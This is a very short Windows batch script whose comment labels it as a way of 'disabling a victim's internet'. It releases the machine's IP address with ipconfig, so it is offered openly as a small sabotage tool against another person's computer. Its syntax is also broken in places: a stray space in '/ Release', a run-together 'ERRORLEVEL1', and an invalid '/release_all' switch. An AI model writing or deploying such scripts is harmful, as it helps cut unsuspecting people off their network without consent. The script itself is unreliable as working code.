: Disabling a victim’s internet
@echo off

ipconfig / Release

if ERRORLEVEL1 ipconfig /release_all

exit